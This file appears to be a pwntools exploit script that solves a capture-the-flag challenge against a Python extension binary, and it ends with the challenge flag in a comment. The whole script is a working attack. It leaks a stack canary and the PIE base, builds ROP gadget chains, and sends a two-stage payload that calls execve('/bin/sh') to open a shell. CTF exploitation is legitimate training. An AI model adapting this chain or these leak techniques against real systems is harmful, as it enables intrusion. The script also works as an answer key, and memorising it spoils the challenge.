from pwn import *
import time

r = process(['./python3.10', 'main.py']) # remote("pwn.chal.ctf.gdgalgiers.com", 1403) # 

# Canary Leak

r.sendline(b"-167")
time.sleep(0.1)
r.sendline(b"A"*(167-8*9-7))

r.recvuntil(b'AAAAAAAAAA\n')

canary = r.readline().strip()
canary = u64(canary.rjust(8, b'\0'))
print("Canary:", hex(canary))

# PIE Leak

r.sendline(b'n')
r.sendline(b"A"*(167-8*9-7) + b'\0y')

r.sendline(b'1')

r.sendline(str(-500+8+8 + 8*5 +8*12 +7 - 3 +8+8).encode())
time.sleep(0.1)
r.sendline(b"A"*(167-8*9-7) + b"c"*8 + b"h"*(16) + b"a"*(8*8) + b"b"*7)

r.recvuntil(b'aaaabbbbbbb\n')

pie_base = u64(r.readline().strip().ljust(8, b'\0')) - 0x17c06b
print("PIE Base:", hex(pie_base))

# Gadgets
syscall     = 0x00000000000e663d + pie_base
pop_rax     = 0x000000000008b088 + pie_base
pop_rdi     = 0x0000000000070a3c + pie_base
pop_rsi     = 0x0000000000071eff + pie_base
pop_rdx     = 0x000000000006fbbe + pie_base
pop_rdi_rdx = 0x000000000013fb27 + pie_base

# Functions
read = 0x6d590 + pie_base

# Memory regions
writeable = 0x556000 + pie_base + 0x100

r.sendline(b'n')

# Send initial ROP Chain to call read(0, rsi, 0x8000)
# RSI Register already contains a stack address in which our payload is stored.
# If we write enough bytes, we'll reach our ROP Chain area & write more after it.
payload = p64(pop_rdi_rdx)
payload += p64(0) # rdi
payload += p64(0x8000) # rdx
payload += p64(read)

r.sendline(b"A"*(167-8*9-7) + p64(canary) + b"h"*16 + b"a"*(8*5) + payload + b'y')

# 2nd stage ROP Chain
payload2 = b"a"*184
# Call read(0, writeable, 0x200) to write /bin/sh
payload2 += p64(pop_rdi) + p64(0)
payload2 += p64(pop_rsi) + p64(writeable)
payload2 += p64(pop_rdx) + p64(0x200)
payload2 += p64(read)

# Syscall to execute execve("/bin/sh", NULL, NULL)
payload2 += p64(pop_rdi) + p64(writeable)
payload2 += p64(pop_rsi) + p64(0)
payload2 += p64(pop_rdx) + p64(0)
payload2 += p64(pop_rax) + p64(59)
payload2 += p64(syscall)

r.sendline(payload2)
r.sendline(b"/bin/sh\0")


r.interactive() # CyberErudites{4Lr1GHt_im_nEveR_Wr1TIng_C_3xten$1oN$_4G41n}
